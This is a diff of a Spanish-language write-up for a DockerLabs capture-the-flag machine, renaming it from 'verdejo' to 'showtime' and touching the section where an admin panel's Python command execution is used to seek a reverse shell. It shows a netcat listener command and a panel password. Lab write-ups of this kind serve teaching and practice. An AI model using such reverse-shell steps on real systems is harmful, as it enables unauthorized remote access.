@@ -12,13 +12,13 @@ icon: linux
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
 ```bash
-unzip verdejo.zip
+unzip showtime.zip
 ```
 
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
-sudo bash auto_deploy.sh verdejo.tar
+sudo bash auto_deploy.sh showtime.tar
 ```
 
 Info:
@@ -285,13 +285,15 @@ Contraseña: MiClaveEsInhackeable
 
 ![](../../images/RCEsii.png)
 
+Accedemos y nos encontramos con un panel de administración.
+
 ## RCE
 
 Vemos que desde este panel de administración podemos ejecutar comandos en `Python`. 
 
 Vamos a intentar obtener una `reverse shell` aprovechando la ejecución remota de comandos.
 
-Ponemos un `listener` en la máquina atacante.
+Ponemos un `listener` en nuestra máquina atacante.
 
 ```Bash
 sudo nc -nlvp 4444
